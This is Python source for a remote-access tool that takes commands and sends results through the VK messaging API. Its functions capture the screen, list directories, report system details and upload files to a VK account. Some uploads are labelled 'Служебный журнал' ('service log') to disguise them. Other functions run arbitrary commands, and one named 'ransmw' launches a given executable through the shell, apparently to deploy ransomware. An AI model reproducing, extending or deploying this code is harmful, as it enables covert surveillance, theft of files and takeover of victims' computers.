import vk
import requests
import os
from PIL import ImageGrab
import platform
import subprocess
import time
import json

session = vk.AuthSession(access_token='Your VK Tokken')
vkapi = vk.API(session, v='5.62')
jso = json


def send_photo(target, path, uid ):
    try:
        # 19370933 512306586
        data = vkapi.photos.getMessagesUploadServer(user_id=target)

        upload_url = data["upload_url"]

        files = {'photo': (open(path, 'rb'))}

        response = requests.post(upload_url, files=files)
        result = json.loads(response.text)

        uploadresult = vkapi.photos.saveMessagesPhoto(server=result["server"],
                                                  photo=result["photo"],
                                                  hash=result["hash"])

        # Photo + id sender + _ + upload id
        att = 'photo' + str(uid) +'_' + str(uploadresult[0]['id'])
        vkapi.messages.send(user_id=target, message=os.path.split(path)[1], attachment=att)

        make_log('Функция send_photo успешновыполнена для пользователя ' + target)

    except Exception as err:
        vkapi.messages.send(user_id=target, message=err)

        make_log(err)


def send_doc(target, path, uid ):

    try:
        # 19370933 512306586
        # 19370933 512306586
        upload_url = vkapi.docs.getMessagesUploadServer(type='doc', peer_id=target)['upload_url']

        response = requests.post(upload_url, files={
            'file': open(path, 'rb')})
        result = jso.loads(response.text)
        file = result['file']

        json = vkapi.docs.save(file=file, title='Служебный журнал', tags=[])[0]

        owner_id = json['owner_id']
        photo_id = json['id']

        att = 'doc' + str(owner_id) + '_' + str(photo_id)
        vkapi.messages.send(user_id=target, message=os.path.split(path)[1], attachment=att)

        make_log('Функция send_doc успешновыполнена для пользователя ' + target)
    except Exception as err:
        vkapi.messages.send(user_id=target, message=err)

        make_log(err)


def scrn_get(target):
    try:
        snapshot = ImageGrab.grab()

        snapshot.save('C:/Users/user/Desktop/Python/file_manager/src/scr.png', format='PNG')

        data = vkapi.photos.getMessagesUploadServer(user_id=target)

        upload_url = data["upload_url"]

        files = {'photo': ('scr.png', open('C:/Users/user/Desktop/Python/file_manager/src/scr.png', 'rb'))}

        response = requests.post(upload_url, files=files)
        result = json.loads(response.text)

        uploadResult = vkapi.photos.saveMessagesPhoto(server=result["server"],
                                                      photo=result["photo"],
                                                      hash=result["hash"])

        # Photo + id sender + _ + upload id
        att = 'photo' + str(512306586) + '_' + str(uploadResult[0]['id'])
        vkapi.messages.send(user_id=target, message=os.path.split('C:/Users/user/Desktop/Python/file_manager/src/scr.png')[1], attachment=att)

        make_log('Функция scrn_get успешновыполнена для пользователя ' + str(target))

    except Exception as err:
        vkapi.messages.send(user_id=target, message=err)

        make_log(err)


def get_files(dir_path, target):
    try:
        files = os.listdir(dir_path)
        vkapi.messages.send(user_id=target, message=files)

        make_log('Функция ransmw успешновыполнена для пользователя ' + target)

    except Exception as err:
        vkapi.messages.send(user_id=target, message=err)

        make_log(err)


def get_sysinfo(target):
    vkapi.messages.send(user_id=target, message=platform.uname())

    make_log('Функция get_files успешновыполнена для пользователя ' + target)


def cmd_exec(target, command):
    try:
        cmd = subprocess.Popen(command)
        vkapi.messages.send(user_id=target, message='Shell Статус:' + str(cmd))

        make_log('Функция cmd_exec успешновыполнена для пользователя ' + target)

    except Exception as err:
        vkapi.messages.send(user_id=target, message=err)

        make_log(err)


def path_to_type_cycle(target, pathc, frmtc):
    try:
        for file in os.listdir(pathc):
            if file.endswith('.'+str(frmtc)):
                filedic = os.path.join(pathc, file)
                filedic = filedic.split(',')
                for Ifile in filedic:
                    vkapi.messages.send(user_id=target, message=Ifile)
                    time.sleep(0.5)

        make_log('Функция path_to_type_cycle успешновыполнена для пользователя ' + target)

    except Exception as err:
        vkapi.messages.send(user_id=target, message='В директории ' + pathc + ' файлы ' + frmtc + ' отсутствуют!')

        make_log(err)


def snd_dirs(targetf, pathf, frmtf):
    try:
        for file_s in os.listdir(pathf):
            if file_s.endswith('.'+str(frmtf)):
                fls = os.path.join(pathf, file_s)
        vkapi.messages.send(user_id=targetf, message=str(fls))

        make_log('Функция snd_dirs успешновыполнена для пользователя ' + targetf)

    except Exception as err:
        vkapi.messages.send(user_id=targetf, message='В директории ' + pathf + ' файлы ' + frmtf + ' отсутствуют!')

        make_log(err)


def ransmw(target, path):
    try:
        cmd = subprocess.Popen(str(path), shell=True)
        vkapi.messages.send(user_id=target, message='Статус процесса:' + str(cmd))

        make_log('Функция ransmw успешновыполнена для пользователя ' + target)

    except Exception as err:
        vkapi.messages.send(user_id=target, message=err)

        make_log(err)


def make_log(text):
    log = open('C:\\Users\\user\\Desktop\\Python\\file_manager\\src\\log.txt', 'a')
    log.write(str(text) + ' -- ' + str(time.strftime("%Y-%m-%d %H:%M:%S")) + '\n')
    log.close()
